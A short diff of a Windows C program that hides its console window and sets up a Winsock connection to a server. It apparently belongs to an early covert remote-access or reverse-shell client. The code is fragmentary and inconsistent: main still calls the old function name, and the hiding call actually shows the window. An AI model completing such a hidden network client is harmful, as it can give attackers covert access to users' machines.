@@ -1,10 +1,10 @@
-#include <windows.h> //Ocultar la consola
 #include <winsock2.h> //Crear socket
+#include <windows.h> //Ocultar la consola
 
-#pragma comment(lib, "ws_32.lib")
+#pragma comment(lib, "Ws2_32.lib")
 
-void HideCmdWindows(){
-	HWND hide = FindWindowsA("ConsoleWindowClass",NULL); //check
+void HideCmdWindowsWithoutFlash(){
+	HWND hide = FindWindowA("ConsoleWindowClass",NULL); //check
 	AllocConsole(); //check
 	ShowWindow(hide,SW_SHOWNORMAL);
 }
@@ -40,8 +40,8 @@ int main(){
 	SOCKET socket;
 	HideCmdWindows();
 	StartUseWinsockDll(wsadata);
-	createSocket(&socket);
-	CreateSockAddr_In(&server);
+	createSocket(socket);
+	CreateSockAddr_In(server);
 	ConnectSocket();
 
 
